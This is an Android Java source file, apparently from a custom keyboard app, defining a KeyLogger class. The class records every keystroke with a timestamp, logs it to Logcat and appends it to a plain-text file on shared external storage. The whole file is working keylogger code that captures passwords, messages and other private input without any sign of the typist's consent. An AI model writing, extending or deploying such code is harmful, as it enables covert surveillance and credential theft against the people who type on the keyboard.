package com.example.keyloggerkeyboard;

import android.content.Context;
import android.os.Environment;
import android.util.Log;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class KeyLogger {
    private static final String TAG = "KeyLogger";
    private static final String LOG_DIR = "KeyLogger";
    private static final String LOG_FILE = "key_logs.txt";
    
    private Context context;
    private SimpleDateFormat dateFormat;
    
    public KeyLogger(Context context) {
        this.context = context.getApplicationContext();
        this.dateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
    }
    
    public void logKey(int keyCode) {
        String keyString = convertKeyCodeToString(keyCode);
        String timestamp = dateFormat.format(new Date());
        String logEntry = timestamp + " - Key: " + keyString + " (Code: " + keyCode + ")\n";
        
        // Log to Android Logcat (for debugging)
        Log.d(TAG, logEntry.trim());
        
        // Save to file
        saveToFile(logEntry);
    }
    
    private String convertKeyCodeToString(int keyCode) {
        switch (keyCode) {
            case -5: return "[BACKSPACE]";
            case -4: return "[ENTER]";
            case -3: return "[SPACE]";
            case -2: return "[MODE_CHANGE]";
            case -1: return "[SHIFT]";
            case 32: return "[SPACE]";
            case 10: return "[ENTER]";
            case 9:  return "[TAB]";
            default:
                if (keyCode >= 0 && keyCode <= 255) {
                    return Character.toString((char) keyCode);
                }
                return "[UNKNOWN:" + keyCode + "]";
        }
    }
    
    private void saveToFile(String data) {
        FileOutputStream fos = null;
        try {
            File dir = new File(Environment.getExternalStorageDirectory(), LOG_DIR);
            if (!dir.exists()) {
                dir.mkdirs();
            }
            
            File file = new File(dir, LOG_FILE);
            fos = new FileOutputStream(file, true); // Append mode
            
            fos.write(data.getBytes());
            fos.flush();
            
        } catch (IOException e) {
            Log.e(TAG, "Error saving log: " + e.getMessage());
        } finally {
            if (fos != null) {
                try {
                    fos.close();
                } catch (IOException e) {
                    Log.e(TAG, "Error closing stream: " + e.getMessage());
                }
            }
        }
    }
    
    public String getLogFilePath() {
        File dir = new File(Environment.getExternalStorageDirectory(), LOG_DIR);
        File file = new File(dir, LOG_FILE);
        return file.getAbsolutePath();
    }
}